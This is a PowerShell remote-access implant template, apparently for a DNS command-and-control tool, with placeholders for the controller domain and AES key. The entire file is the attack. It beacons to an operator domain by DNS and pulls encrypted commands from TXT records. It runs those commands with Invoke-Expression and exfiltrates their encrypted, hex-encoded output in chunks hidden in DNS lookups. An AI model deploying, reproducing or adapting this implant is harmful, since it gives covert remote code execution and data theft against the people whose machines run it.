$url="{{.Domain}}";
$uidr=Get-Random;
$uid=$uidr.toString();
function Create-AesManaged($iv) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($iv) {
        $aesManaged.IV = $iv
    }else{
    $aesManaged.GenerateIV()
    }
    $aesManaged.Key = [system.Convert]::FromBase64String("{{.Key}}")
    $aesManaged
}
function Encrypt($unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManaged
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $fullData = $aesManaged.IV + $encryptedData  
    $hmacsha = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha.key = $aesManaged.Key
    $aesManaged.Dispose()
    $signature = $hmacsha.ComputeHash($fullData)
    $fullData = $signature + $fullData
    return $fullData
}
function decrypt($ct){
    $Bytes = [byte[]]::new($ct.Length / 2)
        For($i=0; $i -lt $ct.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($ct.Substring($i, 2), 16)
    }
    $sig = $Bytes[0..31]
    $Bytes = $bytes[32..($bytes.Length-1)]
    $iv = $Bytes[0..15]
    $bytes = $Bytes[16..($bytes.Length-1)]
    $hmacsha = New-Object System.Security.Cryptography.HMACSHA256
    $aesManaged = Create-AesManaged $iv
    $hmacsha.key = $aesManaged.Key
    $aesManaged.Dispose()
    $signature = $hmacsha.ComputeHash($iv+$bytes)
    $areEqual = @(Compare-Object $signature $sig -SyncWindow 0).Length -eq 0
    if (!$areEqual){
        return
    }
    $aesManaged = Create-AesManaged $iv
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose()
    $z = [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    $z 
}
function execDNS{
    Param(
        [parameter(position=0)]$cmd,
        [parameter(position=1)]$cmdid
    )
    $cmd=[system.String]$cmd;
    $c=(iex $cmd)2>&1|Out-String;
    $c = encrypt $c
    $string=($c|Format-Hex|Select-Object -Expand Bytes|ForEach-Object{'{0:x2}' -f $_}) -join '';
    $len=$string.Length;
    $split={{.Split}};
    $repeat=[Math]::Floor($len/$split);
    $remainder=$len%$split;
    $repeatr=$repeat;
    if($remainder){
        $repeatr=$repeat+1;
    };
    for($i=0;$i -lt $repeat;$i++){
        $str=$string.Substring($i*$Split,$Split);
        $durl=$str+"."+($i+1)+"."+$repeatr+"."+$cmdid+"."+$uid+"."+$url;
        $q=resolve-dnsname -Name $durl -type 1;
    };
    if($remainder){
        $str=$string.Substring($len-$remainder);
        $durl2=$str+"."+($i+1)+"."+$repeatr+"."+$cmdid+"."+$uid+"."+$url;
        $q=resolve-dnsname -type 1 $durl2;
    };
};
function getCmd{
    Param(
        [parameter(position=0)]$domain,
        [parameter(position=0)]$cmdid
    )
}
while(1){
    $checkin=$uid+"."+$url;
    $q=resolve-dnsname -type 1 -Name $checkin;
    $c=Get-Random;
    $cs=$c.ToString();
    Start-Sleep -s 5;
    $u=$cs+"."+$uid+"."+$url;
    $txt=resolve-dnsname -type 16 -dnsonly $u|select-object Strings|%{$_.Strings}|Out-String;
    $txt=$txt-replace"`n|`r";
    $txt = decrypt $txt;
    if($txt -match'NoCMD'){continue}elseif($txt -match'exit'){Exit}else{execDNS -cmd $txt -cmdid $cs};
};
